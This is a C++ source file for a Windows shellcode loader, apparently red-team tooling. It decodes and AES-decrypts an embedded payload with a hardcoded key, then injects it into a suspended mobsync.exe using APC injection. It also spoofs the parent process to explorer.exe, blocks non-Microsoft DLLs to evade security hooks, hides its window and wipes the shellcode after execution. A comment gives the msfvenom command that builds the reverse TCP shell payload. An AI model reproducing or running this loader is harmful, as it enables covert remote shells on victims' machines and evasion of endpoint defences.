#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(10000);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    //shellcode = "z33lrIYAG7pcIAZfrX7cRKLyNwr1w+zD1pSGQXA/0emhQBn2C1z5SjOjyGu5FL2Wrq3xADX+MDyaZs/F8BIBXcqPK1TFdESehzl8uO8+NT+Mda0BjZSGUcd0qs3PO4klwSOhSDrlTUhjCe9+7QoaFc8g0yTIGiAP674VA6URsKd9y0szNTBgSgn/L6gB2WpfGQ4UBaHGDiQ8GwrzedHh/eTbhZtS2/9HEoVqkoAqG2gts1rWt4ckzvEJRM8v4zJxLzMEtNnf3e9TBaG1CNfWCWg+SPIfW2L6SLUA16EadwwSihhKk84KGQyTEgQ9Ue1/VMt30TREUC46P3IvidPVG6LgIQs5pHXYEPPBBV2vCufLCQ3F6ChFwMhZJvzRF/30P6+POoyFAMHvwSrebSGiliwWgrqcAvRPuWxcu3T5DdqEXoDzESk75W8n4kGZWI3cgiVvDpTt3vFST2gdW7j2ri75T0P5Ut1HWAxGr75ir68RX4HB8Mli78eP6UcLuFHULrz5W0tpA3yyefUapF7mK+gGbuFZ6pyLRrkG2XWLmo1Ji1/2yGzuHQ0Q4HacssCuN/peqkKbm++unMiu/D3lGlH2KGdCBhBEubVULKFFvZ0=";
    shellcode = "moaecPF5UPpx2xBg5CD3DaYRgX/1ouboPrEoIyhLeYyS96Twb/qltHF81IAloOpOpR8RWjq4G7GtGsqeE5moioG/sM9Ep5rvEXSSwLQW8i3rJv4eVG+HRimHBVRsWn+ywlFWtYRFt8dRxvrXuRmUbEEgdXbhGH7Smo+UOEcUtBq7dmA4aQ7CBYC6QRZSvXm2cXmkX2Diu+c08nb1wSdYkL57y0xOYA8KXJg+xNqTUy2SlyoyRjr5eX/URFPL9yU/INQoX5Qb4dQT72eWaV/XxsA9k0UNoXjd2bfRjv639qzqjIGTKJvv3hmIYe9UJEVzihi/BZMprShIOWsptU5beLSse1G/VAqlj6kFaj9UGd7BXZ4y+VJvugyVOWgz2Lyc5N3hSWoeUeahJbuR5cVMRRC7Mx/iOatEPrkY6GBITAYzvWietUdO07GNWNgsJ8n2oLL7X/Ol4+qA3pe+ZV5yY0r5QtWW5dTGFSGuY4yhvx6lCKoHuhZMqevCuPWpZemIATbSxN1rHXR5GR+fdYYSAq2ZSbvu6EH7T6o9nZifHD9sQDr2YRBaVnDG9jD1Mgu+kZlXicQkuhFA8AaiR43PPhr9CH93rVKOJblIg6Apj+/BBgZOnuo7Xwd7IpqQjrqq+eZrFePq8ZZo+8oGTeSxv/UeRkzY7ndft73pioLcFXe1/Q0lBzGuL6sQFEX1O4IDI5VGHTDTkLy5WLeA9N3RLyA5VmC/O3ATKcU+iejLuezX35S9nNi9WeYaGkRvUlPZF92l0f80FLPTP1k1Okds5IPkfx16KOirmIS+6YvtTzET+QM5sAXtqT/z9hMIoK0HSwpnFvb9Gk/Gz/+LkQVGzE9R5MWaTnDMKuyX3zGAIa7XhEuRr5aRT3VkyGQVYWcaRGz6RHJx5PSgXzaDRz5x7sZWKzfC/dcvlr+6TQ4jWB3ug0vl22zg64IoTY+qLU3eHfdkH6mj468DgOZX7xllVAzlza8xamaH3LUQiNoYZp5UJwCZI9DdPukBUYlg1kYjxxTUKVFdM7W2gELI8hR9kQECunPpMhYOJnPGn7Ic9Uar8NguWW94KesA67y6cjTPM8e5/87K9nb30aSf60gizAS3Hype76WaQS+eKZOwY10cJNUjxcgFK6dhebS7sg7+X7CdaGdaj1ggl44DdcZ8vqey8Xle0FkudGfUYTLr7UEA5HtMGpuZ6QBOwIx/4+qTARxBWOL+XazKVGvLGPSu7g==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = { 0xf7,0xc9,0xd0,0xa7,0xf6,0x14,0x7e,0x4b,0x57,0x33,0xdb,0x61,0xa5,0x69,0x70,0xc7,0x47,0x35,0x65,0x04,0xdf,0xdd,0x58,0xd0,0x5b,0x37,0x1d,0x66,0x8f,0xcd,0xcd,0xd7 };
    uint8_t iv[16] = { 0xf7,0xc9,0xd0,0xa7,0xf6,0x14,0x7e,0x4b,0x57,0x33,0xdb,0x61,0xa5,0x69,0x70,0xc7 };
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered);
    return 0;
}

